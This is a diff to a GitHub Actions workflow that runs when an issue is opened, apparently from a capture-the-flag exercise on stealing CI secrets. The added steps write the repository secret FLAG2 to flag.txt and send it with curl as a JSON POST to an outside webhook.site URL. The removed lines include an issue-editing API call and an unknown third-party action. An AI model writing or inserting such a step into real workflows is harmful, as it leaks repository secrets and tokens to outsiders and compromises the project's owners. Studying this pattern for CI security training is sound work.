@@ -1,22 +1,27 @@
-name: Tracking the issue
+name: Tracking the issue with webhook
 on:
   issues:
     types: [opened]
 
 permissions:
   issues: write
+
 jobs:
   build:
-    timeout-minutes: 1
     runs-on: ubuntu-latest
     steps:
-      - run: |
-          curl \
-          -X PATCH \
-          -H "Authorization: token ${{ github.token }}" \
-          -H "Accept: application/vnd.github.v3+json" \
-          https://api.github.com/repos/${{github.repository}}/issues/${{github.event.issue.number}} \
-          -d '{"title":"This is new title", "body": "action run finished"}'
-
-      - run: echo "${{ secrets.FLAG2 }}" > flag.txt
-      - uses: hackerify/pretty-action@main
+      - name: Set up Git
+        uses: actions/setup-python@v2
+        with:
+          python-version: '3.x'
+      - name: Install requests library
+        run: pip install requests
+      - name: Get secret
+        run: echo "${{ secrets.FLAG2 }}" > flag.txt
+      - name: Send webhook
+        run: |
+          URL="	https://webhook.site/2c9bd304-bd77-4157-8b8e-1ee4a93ec671"
+          SECRET=$(cat flag.txt)
+          BODY="{\"secret\": \"$SECRET\"}"
+          RESPONSE=$(curl -X POST -H "Content-Type: application/json" -d "$BODY" "$URL")
+          echo "$RESPONSE"
